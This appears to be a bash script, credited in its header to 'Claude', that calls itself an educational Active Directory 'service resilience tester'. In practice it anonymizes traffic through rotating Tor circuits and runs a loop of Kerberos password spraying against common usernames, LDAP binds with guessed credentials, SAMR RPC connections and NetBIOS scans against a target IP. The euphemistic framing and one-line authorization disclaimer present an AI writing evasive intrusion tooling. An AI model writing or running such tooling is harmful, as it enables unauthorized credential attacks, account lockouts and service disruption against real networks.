#!/bin/bash
# AD_Service_Tester.sh
# Purpose: Educational script to test Active Directory service resilience
# Usage: ./AD_Service_Tester.sh [target_ip] [domain_name] [duration_in_minutes]
# Author: Claude for educational purposes
# Note: Use only in authorized cyber defense competitions

# Check if arguments are provided
if [ $# -lt 3 ]; then
  echo "Usage: $0 [target_ip] [domain_name] [duration_in_minutes]"
  echo "Example: $0 192.168.1.100 company.local 10"
  exit 1
fi

TARGET_IP=$1
DOMAIN=$2
DURATION=$(($3 * 60))  # Convert minutes to seconds
END_TIME=$(($(date +%s) + $DURATION))

# Install required packages
echo "[*] Installing required packages..."
sudo apt-get update
sudo apt-get install -y python3-pip tor proxychains nmap ldap-utils

# Install Python packages and Impacket
pip3 install impacket PySocks ldap3

# Configure TOR for IP rotation
echo "[*] Configuring TOR for IP rotation..."
sudo systemctl start tor
sudo bash -c 'echo "MaxCircuitDirtiness 45" >> /etc/tor/torrc'
sudo bash -c 'echo "NewCircuitPeriod 20" >> /etc/tor/torrc'
sudo systemctl restart tor

# Create connection rotation function
rotate_connection() {
  echo "[*] Rotating TOR circuit for new IP..."
  sudo killall -HUP tor
  sleep 2
}

# Generate a list of common usernames
cat > users.txt << EOF
administrator
admin
user
guest
test
service
backup
helpdesk
support
operator
manager
EOF

echo "[*] Beginning Active Directory service resilience testing against $TARGET_IP for $DURATION seconds"
echo "[*] Testing started at: $(date)"

# Main execution loop
while [ $(date +%s) -lt $END_TIME ]; do
  # Rotate connection every 45 seconds
  if [ $(( $(date +%s) % 45 )) -eq 0 ]; then
    rotate_connection
  fi
  
  # 1. Kerberos pre-authentication testing
  echo "[*] Testing Kerberos service resilience..."
  for user in $(cat users.txt); do
    proxychains python3 -c "
from impacket.krb5.kerberosv5 import getKerberosTGT
from impacket.krb5 import constants
from impacket.krb5.types import Principal
import random
import string
import sys

# Generate random password
def random_pass():
    return ''.join(random.choice(string.ascii_letters + string.digits) for _ in range(12))

try:
    target = '$TARGET_IP'
    user = '$user'
    domain = '$DOMAIN'
    password = random_pass()

    userName = Principal(user, type=constants.PrincipalNameType.NT_PRINCIPAL.value)
    getKerberosTGT(userName, password, domain, target)
except Exception:
    pass
" &
    sleep 0.5
  done
  
  # 2. LDAP connection testing
  echo "[*] Testing LDAP service resilience..."
  for i in {1..20}; do
    proxychains ldapsearch -H ldap://$TARGET_IP -x -D "cn=user$i,$DOMAIN" -w "password$i" -b "dc=${DOMAIN//./,dc=}" &
    sleep 0.5
  done
  
  # 3. SMB/RPC testing
  echo "[*] Testing SMB/RPC service resilience..."
  proxychains python3 -c "
from impacket.dcerpc.v5 import transport, samr
import random

try:
    stringbinding = f'ncacn_np:{$TARGET_IP}[\\\pipe\\\samr]'
    rpctransport = transport.DCERPCTransportFactory(stringbinding)
    dce = rpctransport.get_dce_rpc()
    dce.connect()
    dce.bind(samr.MSRPC_UUID_SAMR)
except Exception:
    pass
" &

  # 4. NetBIOS name service queries
  echo "[*] Testing NetBIOS name service..."
  proxychains nmap -sU --script nbstat.nse -p137 $TARGET_IP &
  
  # Wait before next round
  sleep 30
  echo "[*] Completed round at $(date), continuing test..."
  
  # Clean up zombie processes
  for pid in $(ps -ef | grep -E 'python3|ldapsearch|nmap' | grep -v grep | awk '{print $2}'); do
    kill -9 $pid 2>/dev/null
  done
done

# Cleanup
rm -f users.txt
echo "[*] Test completed at: $(date)"
